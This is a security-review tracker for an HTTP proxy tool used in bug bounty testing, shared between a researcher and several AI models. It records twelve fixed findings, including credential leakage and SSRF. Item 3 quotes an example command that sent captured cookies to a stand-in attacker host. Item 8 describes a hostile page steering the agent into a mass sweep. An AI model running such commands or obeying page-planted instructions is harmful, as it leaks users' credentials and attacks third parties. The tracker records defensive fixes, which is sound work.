# tehut_proxy — security review tracker

**One list, shared between the researcher, the review team (GLM / Codex / DeepSeek / Kimi /
Fable 5.1) and Claude Code. Claim an item here before you start it.**

This file exists because the 2026-09-14 review findings lived only in a chat transcript.
Two people then had no way to tell which of them were already fixed, which is how the same
fix gets written twice and a real one gets dropped. Every item below says DONE (with the
commit that did it and how to check) or OPEN (with enough detail to start from).

Review date: 2026-09-14 · Last updated: 2026-09-15 · **all 12 review items closed**

## How to run what is here

```bash
cd /home/th0th/Documents/hunter/tehut_proxy
python3 test_parsers.py           # 15 — hostile-response parsing
python3 test_policy.py            # 26 — destination policy, credential binding, sweep caps
python3 test_store.py             # 24 — file permissions, locking, rotation
python3 test_engine_receipts.py   # 17 — truncation, single-write receipt, header decode, fan-out
```
All four must stay green. They are plain `unittest`, no deps, no network, and nothing
listens on a port.

---

## DONE

| # | Item | Commit | Verify with |
|---|---|---|---|
| 1 | `_dechunk` hang on a hostile chunk-size (`1*HEXDIG`, RFC 9112 §7.1) | see `git log engine.py` | `test_parsers.py` |
| 2 | HTTP/1 response splitter — unbounded / malformed framing | see `git log engine.py` | `test_parsers.py` |
| 3 | **Credential binding.** `_resolve` let the caller move the TCP destination while the headers still came from the stored base, so `tehut_send base_id=<id> connect_host=attacker.example` sent the captured `Cookie` to the attacker. `tehut_sweep` multiplied it by the value count. Credential headers are now dropped when the destination is not the origin they were captured from, unless `allow_cross_host_credentials` is passed. | `d697508` | `test_policy.py::CredentialBinding`, `::SendPathIntegration` |
| 4 | **Destination policy.** Cloud-metadata hostnames and link-local addresses refused as a TCP destination; optional dot-anchored `TEHUT_PROXY_SCOPE` allowlist. `connect_host` is where *this tool* connects — an SSRF payload aimed at a target belongs in a header or body value — so this costs the product nothing. | `d697508` | `test_policy.py::DestinationPolicy` |
| 5 | **File permissions.** `history.jsonl` (holds captured `Cookie`/`Authorization`) and `~/.tehut_proxy_token` (gates server.py's localhost API) were written at the umask default and narrowed afterwards — and history was never narrowed at all, found at 0664 on the dev box. Now created `O_CREAT\|0o600` with `ensure_private()` on every open. `O_EXCL` on the token also stops two servers from clobbering each other's. | `8228b6b` | `test_store.py::Permissions`, `::Token` |
| 6 | **History locking.** Both processes append to the same file; server.py's `threading.Lock` was invisible to the other. `O_APPEND` keeps a write whole only to PIPE_BUF (4096) and entries carry bodies, so writers interleaved and the reader's bare `except: pass` dropped both. Now an flock, with corrupt lines counted rather than silently skipped. | `8228b6b` | `test_store.py::Locking` (two real processes, 40KB entries) |
| 7 | **History rotation.** Unbounded growth of a *credential* store, and `_get()` re-read the whole file per lookup (a 256-value sweep × a large history = gigabytes of JSON parsing). Trimmed in place under the existing lock — not renamed, which would leave a second copy of the credentials and swap the inode under a waiting writer. `TEHUT_PROXY_HISTORY_MAX_BYTES` (32 MiB), `TEHUT_PROXY_HISTORY_KEEP` (2000). | *this commit* | `test_store.py::Rotation` |
| 8 | **Sweep caps.** `threads` was `int(args.get(...))` with no ceiling and `values[]` was unbounded — "sweep this /16 with 5000 threads" is a sentence a hostile page can put in front of the agent, and even with no attacker it is a DoS we cause ourselves. Clamped to `TEHUT_PROXY_MAX_SWEEP_THREADS` (64) / `TEHUT_PROXY_MAX_SWEEP_VALUES` (1024), reported in the result as `limits`. The executor is also shut down now instead of leaking its threads every sweep. | *this commit* | `test_policy.py::SweepCaps` |
| 9 | **Read caps announce truncation.** `while len(buf) < read_cap` returned a cut response indistinguishable from a complete one — so "the marker was not in the response" and "the response ended before the marker" printed the same thing. The h2 loop had no cap at all (unbounded `body += ev.data` = an OOM a target could trigger) and its `except Exception: pass` made every receive failure look like a clean end. All three read paths now report *why* they stopped, and say what not to conclude from it. | *this commit* | `test_engine_receipts.py::ReadCapTruncation` |
| 10 | **`single_write_release` is measured, not echoed.** It was `bool(single_packet)` — the caller's own input handed back, so it claimed the primitive engaged whenever it had been *asked* for. The field exists so a NEGATIVE race result can be trusted; without a real receipt, "no race" and "the instrument never fired" are the same output. Now checks ALPN actually negotiated h2, the release went in one `send()` (not `sendall`'s retry loop), and the buffer fits the path MSS — with `single_write_release_detail` carrying the numbers. `TCP_NODELAY`, a precondition the primitive assumed but never set, is now set in `_connect`. **Was my bug.** | *this commit* | `test_engine_receipts.py::SingleWriteReceipt` |
| 11 | **h2 header decode is total.** A bare `.decode()` raised `UnicodeDecodeError` on one invalid byte, *inside the receive loop's `except Exception: pass`* — so a target could delete its own response from our evidence with a single `0x80` and it surfaced as "no :status (reset/timeout/closed)", indistinguishable from a network failure. Now latin1 (byte-exact and reversible, matching the h1 parser) with a `lossy` marker so the reader knows it is a transcription. | *this commit* | `test_engine_receipts.py::HeaderDecode` |
| 12 | **`extra_requests` / `extra_streams` capped.** Same fan-out as item 8 one level down, and unbounded — the sweep cap could be walked around by putting the list here instead. `TEHUT_PROXY_MAX_EXTRA` (64), deliberately far below the sweep cap because this path is for connection-state and race work on ONE connection, where the useful numbers are 2-50. `_do_send` trims a copy, so a caller's list is not silently shortened underneath it. | *this commit* | `test_engine_receipts.py::ExtraFanoutCaps` |

## OPEN — unclaimed

Nothing. All 12 items from the 2026-09-14 review are closed as of
2026-09-15. New findings go here as a new numbered row — add the row BEFORE you start
the work, so two people cannot pick it up at once.

## Standing constraints (from CLAUDE.md — these bind every change here)

- Only test assets explicitly in scope on an active bug bounty program or a signed engagement.
- Target blacklist: aliexpress, alibaba, semrush, taobao, tmall, lazada, aliyun, 1688.com.
- Rate-limit aggressively. No DoS. Item 8 exists because this tool could violate this rule on its own.
- Never embed credentials in PoCs, findings or reports.
